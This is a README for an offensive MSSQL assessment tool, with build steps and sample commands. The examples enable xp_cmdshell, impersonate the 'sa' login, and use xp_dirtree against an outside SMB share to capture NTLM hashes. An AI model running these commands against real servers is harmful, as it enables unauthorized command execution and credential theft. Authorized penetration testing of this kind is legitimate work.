# MSSQL Security Assessment Tool

A cross-platform, fully-featured offensive security utility that streamlines enumeration, exploitation, and post-exploitation of Microsoft SQL Server environments.

## Key Features

• **Deep Enumeration** – Quickly map out servers, databases, tables, users, roles, and permissions.
• **Privilege Escalation Work-flows** – Identify and exploit mis-configurations (e.g., `EXECUTE AS`, impersonation, role chaining).
• **Credential Hunting** – Automatically search for credential artefacts, hashes, connection strings, and secrets.
• **Command / Payload Execution** – One-click helpers for `xp_cmdshell`, OLE Automation, `xp_dirtree`, and linked-server abuse.
• **Session Logging & Reporting** – Generates HTML & JSON reports, structured data exports, and timeline logs for every assessment.
• **Self-Contained Builds** – Single-file executables for Windows & Linux via the provided `build.sh` helper.

## Requirements

* .NET 6 SDK *(Linux, macOS, or Windows)*
* Network access to the target SQL Server instance

> The tool relies on `System.Data.SqlClient` (included via NuGet) and **does not** require any third-party binaries.

## Quick Start

```bash
#–– Clone & build (Linux example)
$ git clone https://github.com/Greylorn/MSSQL.git
$ cd MSSQL-Tool/MSSQL
$ ./build.sh linux-x64           # produces bin/publish-linux-x64/MSSQL

#–– Or run directly with dotnet
$ dotnet run --project MSSQL.csproj -- --server dc01.corp1.com --action enum --log
```

## Usage Examples

```bash
# Quick enumeration with logging
MSSQL --server dc01.corp1.com --action enum --log

# Execute arbitrary query
MSSQL --server dc01.corp1.com --action query --sql "SELECT SYSTEM_USER;"

# Trigger xp_dirtree to capture NTLM
MSSQL --server dc01.corp1.com --action dirtree --share "\\\\192.168.49.67\\share"

# Enable & execute xp_cmdshell
MSSQL --server dc01.corp1.com --action xp_cmd --cmd "whoami"

# Impersonate sa
MSSQL --server dc01.corp1.com --action impersonate_login --target sa
```

Use `--help` or run the program without arguments to display the full interactive menu.

## Building Self-Contained Binaries

The helper script wraps `dotnet publish` to create a **single-file, self-contained** executable.

```bash
# Windows x64 EXE (default)
./build.sh

# Windows x86
./build.sh win-x86

# Linux x64
./build.sh linux-x64
```

Resulting binaries are written to `bin/publish-<RID>/`.

## Project Structure

```
MSSQL/
├── Program.cs                # Main source (enumeration & attack logic)
├── MSSQL.csproj              # .NET project file (targets net6.0)
├── build.sh                  # Cross-platform single-file build helper
├── additional_features.md    # Roadmap & nice-to-have ideas
└── ...                       # Reports & session artifacts (git-ignored)
```

## Disclaimer

This software is provided **for educational and authorized penetration-testing purposes only**. The authors assume **no liability** for misuse or damage caused by this tool. Ensure you have **explicit written permission** before targeting any system.

## License

Distributed under the MIT License. See `LICENSE` for more information.
